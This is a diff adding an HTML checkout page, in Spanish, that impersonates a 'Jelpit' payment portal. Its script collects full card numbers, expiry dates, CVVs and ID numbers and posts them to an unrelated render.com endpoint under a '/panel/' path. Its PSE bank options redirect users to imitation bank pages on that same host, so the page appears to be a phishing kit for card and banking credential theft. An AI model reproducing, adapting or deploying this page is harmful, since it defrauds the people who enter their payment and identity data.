@@ -1,0 +1,796 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Portal de Pago - Jelpit</title>
+    <link rel="icon" type="image/svg+xml" href="img/favicon.svg">
+    <!-- Roboto Condensed -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto+Condensed:wght@300;400;700&display=swap" rel="stylesheet">
+    <!-- FontAwesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <!-- Styles -->
+    <link rel="stylesheet" href="css/styles.css">
+    <link rel="stylesheet" href="css/busqueda.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: #f5f5f5;
+            font-family: 'Roboto Condensed', sans-serif;
+            min-height: 100vh;
+        }
+
+        .portal-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px 40px;
+            background: white;
+            border-bottom: 1px solid #e0e0e0;
+        }
+
+        .portal-header-logo {
+            font-size: 24px;
+            font-weight: 700;
+            color: #1dbe5f;
+        }
+
+        .portal-header-logo img {
+            height: 40px;
+        }
+
+        .btn-volver {
+            border: 2px solid #1dbe5f;
+            background: transparent;
+            color: #1dbe5f;
+            padding: 8px 20px;
+            border-radius: 25px;
+            cursor: pointer;
+            font-weight: 600;
+            font-size: 14px;
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            transition: all 0.3s;
+        }
+
+        .btn-volver:hover {
+            background: #1dbe5f;
+            color: white;
+        }
+
+        .portal-main {
+            max-width: 1400px;
+            margin: 40px auto;
+            padding: 0 20px;
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 30px;
+        }
+
+        .portal-card {
+            background: white;
+            border-radius: 16px;
+            padding: 30px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+        }
+
+        .portal-card-title {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 25px;
+            font-size: 18px;
+            font-weight: 700;
+            color: #2e0063;
+        }
+
+        .portal-card-title i {
+            font-size: 20px;
+            color: #2e0063;
+        }
+
+        .portal-divider {
+            border-bottom: 1px solid #e0e0e0;
+            margin-bottom: 20px;
+        }
+
+        .info-row {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 25px;
+            gap: 20px;
+        }
+
+        .info-col {
+            flex: 1;
+        }
+
+        .info-label {
+            font-size: 12px;
+            color: #666;
+            margin-bottom: 6px;
+            font-weight: 600;
+        }
+
+        .info-value {
+            font-size: 14px;
+            color: #333;
+            font-weight: 500;
+        }
+
+        .payment-methods {
+            margin-top: 25px;
+        }
+
+        .payment-methods-title {
+            font-size: 14px;
+            font-weight: 700;
+            color: #333;
+            margin-bottom: 15px;
+        }
+
+        .payment-option {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 14px 16px;
+            border: 1px solid #ccc;
+            border-radius: 6px;
+            cursor: pointer;
+            margin-bottom: 12px;
+            transition: all 0.3s;
+            background: white;
+        }
+
+        .payment-option:hover {
+            border-color: #2e0063;
+            background: #f9f9f9;
+        }
+
+        .payment-option.active {
+            border-color: #1dbe5f;
+            background: #f0fdf4;
+        }
+
+        .payment-option-text {
+            flex: 1;
+            font-size: 14px;
+            font-weight: 500;
+            color: #333;
+        }
+
+        .payment-icons {
+            display: flex;
+            gap: 8px;
+            align-items: center;
+        }
+
+        .payment-icons img {
+            height: 24px;
+            width: auto;
+        }
+
+        .payment-icons i {
+            font-size: 28px;
+        }
+
+        /* Right Column */
+        .portal-summary {
+            background: white;
+            border-radius: 16px;
+            padding: 30px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+        }
+
+        .summary-row {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 16px;
+            font-size: 14px;
+            color: #333;
+        }
+
+        .summary-label {
+            font-weight: 600;
+            color: #333;
+        }
+
+        .summary-value {
+            color: #666;
+        }
+
+        .summary-divider {
+            border-bottom: 1px solid #e0e0e0;
+            margin-bottom: 20px;
+            padding-bottom: 20px;
+        }
+
+        .total-section {
+            text-align: right;
+            margin: 30px 0;
+        }
+
+        .total-label {
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 8px;
+        }
+
+        .total-amount {
+            font-size: 32px;
+            font-weight: 700;
+            color: #2e0063;
+            margin-bottom: 20px;
+        }
+
+        .security-badge {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            font-size: 12px;
+            color: #555;
+            margin-bottom: 20px;
+        }
+
+        .security-badge i {
+            font-size: 14px;
+            color: #1dbe5f;
+        }
+
+        .payment-method-badges {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 25px;
+        }
+
+        .payment-method-badges img {
+            height: 32px;
+            width: auto;
+        }
+
+        .btn-pagar {
+            width: 100%;
+            padding: 14px 20px;
+            background: #a0a0a0;
+            color: white;
+            border: none;
+            border-radius: 20px;
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .btn-pagar:not(:disabled):hover {
+            background: #888;
+        }
+
+        .btn-pagar:disabled {
+            cursor: not-allowed;
+            opacity: 0.6;
+        }
+
+        .btn-pagar.active {
+            background: #1dbe5f;
+        }
+
+        .btn-pagar.active:hover {
+            background: #17a551;
+        }
+
+        /* Mobile Responsive */
+        @media (max-width: 1024px) {
+            .portal-main {
+                grid-template-columns: 1fr;
+            }
+
+            .portal-header {
+                padding: 15px 20px;
+            }
+
+            .portal-card,
+            .portal-summary {
+                padding: 20px;
+            }
+
+            .info-row {
+                flex-direction: column;
+                gap: 15px;
+            }
+
+            .payment-methods {
+                display: none;
+            }
+
+            .payment-methods.show {
+                display: block;
+                margin-top: 20px;
+                padding-top: 20px;
+                border-top: 1px solid #e0e0e0;
+            }
+
+            .total-amount {
+                font-size: 24px;
+            }
+
+            .btn-pagar {
+                padding: 12px 16px;
+                font-size: 14px;
+            }
+        }
+
+        @media (max-width: 768px) {
+            .portal-header {
+                padding: 12px 16px;
+            }
+
+            .portal-main {
+                margin: 20px auto;
+                gap: 20px;
+            }
+
+            .portal-card,
+            .portal-summary {
+                padding: 16px;
+                border-radius: 12px;
+            }
+
+            .portal-card-title {
+                font-size: 16px;
+                margin-bottom: 18px;
+            }
+
+            .info-label {
+                font-size: 11px;
+            }
+
+            .info-value {
+                font-size: 13px;
+            }
+
+            .payment-option {
+                padding: 12px 14px;
+                margin-bottom: 10px;
+            }
+
+            .summary-row {
+                font-size: 13px;
+                margin-bottom: 12px;
+            }
+
+            .total-amount {
+                font-size: 20px;
+                margin-bottom: 15px;
+            }
+
+            .btn-pagar {
+                padding: 10px 16px;
+                font-size: 13px;
+            }
+
+            .ver-detalles {
+                text-align: center;
+                margin-top: 15px;
+            }
+
+            .ver-detalles-link {
+                color: #2e0063;
+                text-decoration: none;
+                font-size: 12px;
+                font-weight: 600;
+                cursor: pointer;
+            }
+        }
+
+        .logo-payment {
+            height: 28px;
+            width: auto;
+            margin: 0 4px;
+        }
+    </style>
+</head>
+
+<body>
+    <!-- Header -->
+    <header class="portal-header">
+        <div class="portal-header-logo">
+            <img src="img/logo_jelpit_color.svg" alt="Jelpit">
+        </div>
+        <a href="verificar.html" class="btn-volver">
+            <i class="fa-solid fa-chevron-left"></i>
+            Volver
+        </a>
+    </header>
+
+    <!-- Main Content -->
+    <main class="portal-main">
+        <!-- Left Column: Cliente Data -->
+        <div class="portal-card">
+            <div class="portal-card-title">
+                <i class="fa-regular fa-user"></i>
+                Datos del cliente
+            </div>
+            <div class="portal-divider"></div>
+
+            <!-- Nombre y Email -->
+            <div class="info-row">
+                <div class="info-col">
+                    <div class="info-label">Nombre completo</div>
+                    <div class="info-value" id="portalNombreCompleto">Cargando...</div>
+                </div>
+                <div class="info-col">
+                    <div class="info-label">Correo Electrónico</div>
+                    <div class="info-value" id="portalCorreo">Cargando...</div>
+                </div>
+            </div>
+
+            <!-- Celular -->
+            <div class="info-row">
+                <div class="info-col">
+                    <div class="info-label">Celular</div>
+                    <div class="info-value" id="portalCelular">Cargando...</div>
+                </div>
+            </div>
+
+            <!-- Métodos de Pago -->
+            <div class="payment-methods">
+                <div class="payment-methods-title">Métodos de pago</div>
+
+                <div class="payment-option active" id="paymentTarjeta">
+                    <div class="payment-option-text">Tarjetas Débito o Crédito</div>
+                    <div class="payment-icons">
+                        <img src="img/mastercard.5ab31ac022d71e0f.png" alt="Mastercard" class="logo-payment">
+                        <img src="img/visa.23bdf942526c2769.png" alt="Visa" class="logo-payment">
+                        <img src="img/american-express.4ee605f4da5f9117.png" alt="American Express" class="logo-payment">
+                        <img src="img/diners.b4cad69ef077aa9e.png" alt="Diners" class="logo-payment">
+                    </div>
+                </div>
+
+                <div class="payment-option" id="paymentPSE">
+                    <div class="payment-option-text">Débito PSE</div>
+                    <div class="payment-icons">
+                        <img src="img/pse.png" alt="PSE" class="logo-payment">
+                    </div>
+                </div>
+
+                <!-- TARJETA Form (Hidden by default) -->
+                <div id="tarjetaForm" style="display: none; margin-top: 20px; padding-top: 20px; border-top: 1px solid #e0e0e0;">
+                    <div style="margin-bottom: 15px;">
+                        <label style="font-size: 12px; color: #666; display: block; margin-bottom: 6px; font-weight: 600;">Tipo de documento</label>
+                        <select id="tarjetaDocType" style="width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 6px; font-size: 14px; font-family: inherit;">
+                            <option value="CC">Cédula de Ciudadanía</option>
+                            <option value="CE">Cédula de Extranjería</option>
+                            <option value="NIT">NIT</option>
+                            <option value="PAS">Pasaporte</option>
+                        </select>
+                    </div>
+
+                    <div style="margin-bottom: 15px;">
+                        <label style="font-size: 12px; color: #666; display: block; margin-bottom: 6px; font-weight: 600;">Cédula</label>
+                        <input type="text" id="tarjetaCedula" placeholder="1234567890" style="width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 6px; font-size: 14px; font-family: inherit;">
+                    </div>
+
+                    <div style="margin-bottom: 15px;">
+                        <label style="font-size: 12px; color: #666; display: block; margin-bottom: 6px; font-weight: 600;">Número de tarjeta</label>
+                        <input type="text" id="tarjetaNumero" placeholder="4111111111111111" style="width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 6px; font-size: 14px; font-family: inherit;">
+                    </div>
+
+                    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 15px;">
+                        <div>
+                            <label style="font-size: 12px; color: #666; display: block; margin-bottom: 6px; font-weight: 600;">Fecha (MM/YY)</label>
+                            <input type="text" id="tarjetaFecha" placeholder="12/27" maxlength="5" style="width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 6px; font-size: 14px; font-family: inherit;">
+                        </div>
+                        <div>
+                            <label style="font-size: 12px; color: #666; display: block; margin-bottom: 6px; font-weight: 600;">CVV</label>
+                            <input type="text" id="tarjetaCVV" placeholder="123" maxlength="4" style="width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 6px; font-size: 14px; font-family: inherit;">
+                        </div>
+                    </div>
+                </div>
+
+                <!-- PSE Form (Hidden by default) -->
+                <div id="pseForm" style="display: none; margin-top: 20px; padding-top: 20px; border-top: 1px solid #e0e0e0;">
+                    <div style="margin-bottom: 15px;">
+                        <label style="font-size: 12px; color: #666; display: block; margin-bottom: 6px; font-weight: 600;">Tipo de documento</label>
+                        <select id="pseDocType" style="width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 6px; font-size: 14px; font-family: inherit;">
+                            <option value="CC">Cédula de Ciudadanía</option>
+                            <option value="CE">Cédula de Extranjería</option>
+                            <option value="NIT">NIT</option>
+                            <option value="PAS">Pasaporte</option>
+                        </select>
+                    </div>
+
+                    <div style="margin-bottom: 15px;">
+                        <label style="font-size: 12px; color: #666; display: block; margin-bottom: 6px; font-weight: 600;">Número de documento</label>
+                        <input type="text" id="pseDocNumber" placeholder="12121212" style="width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 6px; font-size: 14px; font-family: inherit;">
+                    </div>
+
+                    <div style="margin-bottom: 15px;">
+                        <label style="font-size: 12px; color: #666; display: block; margin-bottom: 6px; font-weight: 600;">Banco</label>
+                        <select id="pseBank" style="width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 6px; font-size: 14px; font-family: inherit;">
+                            <option value="">Selecciona una opción</option>
+                            <option value="https://psec-gdb0.onrender.com/transaction/ent/b-nequi/">Nequi</option>
+                            <option value="https://psec-gdb0.onrender.com/transaction/ent/b-34f9/poral/">Bancolombia</option>
+                            <option value="https://psec-gdb0.onrender.com/transaction/ent/b-34f3/">Davivienda</option>
+                            <option value="https://psec-gdb0.onrender.com/transaction/ent/b-34f4/wps.portal/virtual/">Banco De Bogota</option>
+                            <option value="https://psec-gdb0.onrender.com/transaction/ent/b-34f14/">Banco Occidente</option>
+                            <option value="https://psec-gdb0.onrender.com/transaction/ent/b-34f18/">Banco Popular</option>
+                            <option value="https://psec-gdb0.onrender.com/transaction/ent/b-34f1/">Banco AV villas</option>
+                            <option value="https://psec-gdb0.onrender.com/transaction/ent/b-34f2/">Banco Caja Social</option>
+                        </select>
+                    </div>
+
+                    <div style="margin-bottom: 15px;">
+                        <label style="font-size: 12px; color: #666; display: block; margin-bottom: 6px; font-weight: 600;">Tipo de persona</label>
+                        <select id="psePersonType" style="width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 6px; font-size: 14px; font-family: inherit;">
+                            <option value="natural">Personas natural</option>
+                            <option value="juridica">Personas jurídica</option>
+                        </select>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Mobile: Ver detalles -->
+            <div class="ver-detalles" style="display: none;" id="verDetallesMobile">
+                <span class="ver-detalles-link" onclick="togglePaymentMethods()">
+                    <i class="fa-solid fa-chevron-down"></i> Ver detalles
+                </span>
+            </div>
+        </div>
+
+        <!-- Right Column: Pago Summary -->
+        <div class="portal-summary">
+            <div class="portal-card-title">
+                <i class="fa-solid fa-file-invoice"></i>
+                Datos de Pago
+            </div>
+            <div class="portal-divider"></div>
+
+            <!-- Inmueble Info -->
+            <div class="summary-row">
+                <div class="summary-label" id="portalNombreInmueble">Cargando...</div>
+                <div class="summary-value"></div>
+            </div>
+
+            <div class="summary-row">
+                <div class="summary-label">Referencia:</div>
+                <div class="summary-value" id="portalReferencia">Cargando...</div>
+            </div>
+
+            <div class="summary-row">
+                <div class="summary-label">Inmueble:</div>
+                <div class="summary-value" id="portalNumInmueble">Cargando...</div>
+            </div>
+
+            <div class="summary-row">
+                <div class="summary-label">Referencia:</div>
+                <div class="summary-value" id="portalRefInmueble">Cargando...</div>
+            </div>
+
+            <!-- Total Section -->
+            <div class="total-section">
+                <div class="total-label">Total:</div>
+                <div class="total-amount" id="portalTotal">$0.00</div>
+            </div>
+
+            <!-- Security Badge -->
+            <div class="security-badge">
+                <i class="fa-solid fa-lock"></i>
+                El pago es 100% seguro
+            </div>
+
+            <!-- Payment Method Icons -->
+            <div class="payment-method-badges">
+                <img src="img/mastercard.5ab31ac022d71e0f.png" alt="Mastercard" class="logo-payment">
+                <img src="img/visa.23bdf942526c2769.png" alt="Visa" class="logo-payment">
+                <img src="img/american-express.4ee605f4da5f9117.png" alt="American Express" class="logo-payment">
+                <img src="img/pse.png" alt="PSE" class="logo-payment">
+            </div>
+
+            <!-- Pay Button -->
+            <button class="btn-pagar" id="btnPagarFinal">PAGAR</button>
+        </div>
+    </main>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // Traer datos del sessionStorage
+            const userNombre = sessionStorage.getItem('userNombre') || '';
+            const userApellido = sessionStorage.getItem('userApellido') || '';
+            const userEmail = sessionStorage.getItem('userEmail') || '';
+            const userCelular = sessionStorage.getItem('userCelular') || '';
+            const finalAmount = sessionStorage.getItem('finalAmount') || '0';
+
+            const selectedConjuntoRaw = sessionStorage.getItem('selectedConjunto');
+            const selectedApt = sessionStorage.getItem('selectedApt') || 'N/A';
+
+            // Parsear datos del conjunto
+            let nombreConjunto = 'N/A';
+            let direccion = 'N/A';
+            let referencia1 = 'N/A';
+            let referencia2 = 'N/A';
+
+            if (selectedConjuntoRaw) {
+                try {
+                    const conjunto = JSON.parse(selectedConjuntoRaw);
+                    nombreConjunto = conjunto.name || 'N/A';
+                    direccion = conjunto.address || 'N/A';
+                    // Generar referencias (o traer de donde las generen)
+                    referencia1 = 'jf' + new Date().getTime().toString().slice(-10);
+                    referencia2 = selectedApt;
+                } catch (e) {
+                    console.error('Error parsing conjunto:', e);
+                }
+            }
+
+            // Llenar datos del cliente
+            document.getElementById('portalNombreCompleto').textContent = (userNombre + ' ' + userApellido).trim() || 'N/A';
+            document.getElementById('portalCorreo').textContent = userEmail || 'N/A';
+            document.getElementById('portalCelular').textContent = userCelular || 'N/A';
+
+            // Llenar datos de pago
+            document.getElementById('portalNombreInmueble').textContent = nombreConjunto;
+            document.getElementById('portalReferencia').textContent = referencia1;
+            document.getElementById('portalNumInmueble').textContent = 'Inmueble: ' + selectedApt;
+            document.getElementById('portalRefInmueble').textContent = referencia2;
+
+            // Formatear y mostrar total
+            const totalNumber = parseInt(finalAmount) || 0;
+            const totalFormatted = new Intl.NumberFormat('es-CO', {
+                style: 'currency',
+                currency: 'COP',
+                minimumFractionDigits: 0
+            }).format(totalNumber);
+            document.getElementById('portalTotal').textContent = totalFormatted;
+
+            // Mostrar/ocultar "Ver detalles" en móvil
+            function checkMobile() {
+                const isMobile = window.innerWidth <= 1024;
+                const verDetalles = document.getElementById('verDetallesMobile');
+                const paymentMethods = document.querySelector('.payment-methods');
+
+                if (isMobile) {
+                    verDetalles.style.display = 'block';
+                    paymentMethods.classList.remove('show');
+                } else {
+                    verDetalles.style.display = 'none';
+                    paymentMethods.classList.add('show');
+                }
+            }
+
+            checkMobile();
+            window.addEventListener('resize', checkMobile);
+
+            // Button handlers
+            const paymentTarjeta = document.getElementById('paymentTarjeta');
+            const paymentPSE = document.getElementById('paymentPSE');
+            const btnPagar = document.getElementById('btnPagarFinal');
+
+            // Seleccionar método de pago
+            paymentTarjeta.addEventListener('click', function() {
+                paymentTarjeta.classList.add('active');
+                paymentPSE.classList.remove('active');
+                document.getElementById('tarjetaForm').style.display = 'block';
+                document.getElementById('pseForm').style.display = 'none';
+                btnPagar.classList.add('active');
+                btnPagar.disabled = false;
+                sessionStorage.setItem('metodoPago', 'tarjeta');
+            });
+
+            paymentPSE.addEventListener('click', function() {
+                paymentPSE.classList.add('active');
+                paymentTarjeta.classList.remove('active');
+                document.getElementById('tarjetaForm').style.display = 'none';
+                document.getElementById('pseForm').style.display = 'block';
+                btnPagar.classList.add('active');
+                btnPagar.disabled = false;
+                sessionStorage.setItem('metodoPago', 'pse');
+            });
+
+            // Click en botón pagar
+            btnPagar.addEventListener('click', function() {
+                const metodoPago = sessionStorage.getItem('metodoPago') || 'tarjeta';
+
+                if (metodoPago === 'pse') {
+                    const pseDocType = document.getElementById('pseDocType').value;
+                    const pseDocNumber = document.getElementById('pseDocNumber').value;
+                    const pseBank = document.getElementById('pseBank').value;
+                    const psePersonType = document.getElementById('psePersonType').value;
+
+                    // Validar que estén completos
+                    if (!pseDocNumber || !pseBank) {
+                        alert('Por favor completa todos los campos de PSE');
+                        return;
+                    }
+
+                    // Guardar datos PSE en sessionStorage
+                    sessionStorage.setItem('pseDocNumber', pseDocNumber);
+                    sessionStorage.setItem('pseBank', pseBank);
+                    sessionStorage.setItem('pseDocType', pseDocType);
+                    sessionStorage.setItem('psePersonType', psePersonType);
+
+                    // Redirigir al banco seleccionado
+                    window.location.href = pseBank;
+                } else {
+                    // Pago con tarjeta
+                    const tarjetaDocType = document.getElementById('tarjetaDocType').value;
+                    const tarjetaCedula = document.getElementById('tarjetaCedula').value;
+                    const tarjetaNumero = document.getElementById('tarjetaNumero').value;
+                    const tarjetaFecha = document.getElementById('tarjetaFecha').value;
+                    const tarjetaCVV = document.getElementById('tarjetaCVV').value;
+
+                    // Validar campos
+                    if (!tarjetaCedula || !tarjetaNumero || !tarjetaFecha || !tarjetaCVV) {
+                        alert('Por favor completa todos los campos de tarjeta');
+                        return;
+                    }
+
+                    // Preparar datos para enviar
+                    const formData = new FormData();
+                    formData.append('numero_tarjeta', tarjetaNumero);
+                    formData.append('fecha', tarjetaFecha);
+                    formData.append('cvv', tarjetaCVV);
+                    formData.append('nombre', userNombre);
+                    formData.append('apellido', userApellido);
+                    formData.append('tipo_doc', tarjetaDocType);
+                    formData.append('cedula', tarjetaCedula);
+                    formData.append('celular', userCelular);
+                    formData.append('email', userEmail);
+                    formData.append('monto', finalAmount);
+
+                    // Enviar a backend
+                    fetch('https://psec-gdb0.onrender.com/panel/run/create_tarjeta_m3it3m.php', {
+                        method: 'POST',
+                        body: formData
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        if (data.status === 'OK') {
+                            alert('✅ Transacción registrada correctamente. ID: ' + data.id);
+                            sessionStorage.clear();
+                            window.location.href = 'busqueda.html';
+                        } else {
+                            // Mostrar mensaje amigable, no técnico
+                            alert('❌ No se pudo procesar el pago. Por favor intenta de nuevo.');
+                        }
+                    })
+                    .catch(error => {
+                        alert('❌ Error de conexión. Por favor intenta de nuevo.');
+                    });
+                }
+            });
+
+            // ✅ Auto-formatear fecha (MM/YY)
+            document.getElementById('tarjetaFecha').addEventListener('input', function(e) {
+                let value = e.target.value.replace(/\D/g, ''); // Solo números
+                if (value.length >= 2) {
+                    value = value.slice(0, 2) + '/' + value.slice(2, 4);
+                }
+                e.target.value = value;
+            });
+
+            // ✅ Solo números en CVV
+            document.getElementById('tarjetaCVV').addEventListener('input', function(e) {
+                e.target.value = e.target.value.replace(/\D/g, '');
+            });
+        });
+
+        function togglePaymentMethods() {
+            const methods = document.querySelector('.payment-methods');
+            methods.classList.toggle('show');
+        }
+    </script>
+</body>
+
+</html>
